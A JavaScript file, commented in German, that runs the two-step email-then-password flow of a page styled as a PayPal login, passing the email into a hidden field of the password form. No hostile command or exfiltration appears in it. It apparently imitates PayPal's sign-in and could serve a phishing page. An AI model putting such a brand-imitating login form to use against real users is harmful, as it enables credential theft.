// ==========================================
//  PayPal Login – Interaktions-Logik
// ==========================================

const stepEmail    = document.getElementById('step-email');
const stepPassword = document.getElementById('step-password');
const emailInput   = document.getElementById('email');
const passwordInput = document.getElementById('password');
const hiddenEmail  = document.getElementById('hiddenEmail');
const displayedEmail = document.getElementById('displayedEmail');
const avatarInitial  = document.getElementById('avatarInitial');

// ---- Schritt 1 → Schritt 2 ----
function nextStep() {
  const val = emailInput.value.trim();

  if (!val) {
    shakeInput(emailInput);
    return;
  }

  // E-Mail / Telefon übernehmen
  hiddenEmail.value = val;
  displayedEmail.textContent = val;

  // Avatar-Initial setzen
  const initial = val[0].toUpperCase();
  avatarInitial.textContent = initial;

  // Schritt wechseln
  stepEmail.classList.remove('active');
  stepPassword.classList.add('active');

  setTimeout(() => passwordInput.focus(), 80);
}

// ---- Schritt 2 → Schritt 1 ----
function prevStep() {
  stepPassword.classList.remove('active');
  stepEmail.classList.add('active');
  setTimeout(() => emailInput.focus(), 80);
}

// ---- Passwort anzeigen / verbergen ----
function togglePassword() {
  const isText = passwordInput.type === 'text';
  passwordInput.type = isText ? 'password' : 'text';

  const icon = document.getElementById('eye-icon');
  if (isText) {
    icon.innerHTML = `
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
      <circle cx="12" cy="12" r="3"/>
    `;
  } else {
    icon.innerHTML = `
      <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
      <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
      <line x1="1" y1="1" x2="23" y2="23"/>
    `;
  }
}

// ---- Schütteln bei leerem Feld ----
function shakeInput(input) {
  input.style.animation = 'none';
  input.offsetHeight; // reflow
  input.classList.add('shake');
  setTimeout(() => input.classList.remove('shake'), 500);
}

// ---- Enter-Taste: E-Mail-Feld ----
document.getElementById('emailForm').addEventListener('keydown', function(e) {
  if (e.key === 'Enter') {
    e.preventDefault();
    nextStep();
  }
});

// ---- Passwort-Formular absenden ----
document.getElementById('passwordForm').addEventListener('submit', function(e) {
  const pw = passwordInput.value.trim();
  if (!pw) {
    e.preventDefault();
    shakeInput(passwordInput);
  }
});

// ---- CSS-Animation für Shake ----
const style = document.createElement('style');
style.textContent = `
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    15%       { transform: translateX(-6px); }
    30%       { transform: translateX(6px); }
    45%       { transform: translateX(-4px); }
    60%       { transform: translateX(4px); }
    75%       { transform: translateX(-2px); }
    90%       { transform: translateX(2px); }
  }
  .shake { animation: shake 0.45s ease !important; }
`;
document.head.appendChild(style);
